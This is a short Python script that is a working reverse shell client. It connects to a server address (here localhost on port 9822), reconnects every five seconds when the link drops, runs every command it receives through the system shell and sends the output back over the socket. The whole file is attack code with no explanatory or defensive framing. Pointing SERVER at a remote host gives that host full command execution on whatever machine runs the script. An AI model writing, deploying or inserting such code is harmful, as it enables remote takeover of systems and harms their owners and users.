import socket
import subprocess as sp
import time

SERVER = 'localhost'
PORT = 9822

def connect():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER, PORT))
            print("[+] Connected!")

            while True:
                cmd = sock.recv(4096).decode('utf-8')
                if cmd.lower() == "exit":
                    sock.close()
                    return
                result = sp.run(cmd, capture_output=True, shell=True, text=True)
                output = result.stdout if result.stdout else result.stderr
                sock.send((output + "<END>").encode())
        except Exception:
            print("[-] Connection lost. Retrying in 5 seconds...")
            time.sleep(5)

connect()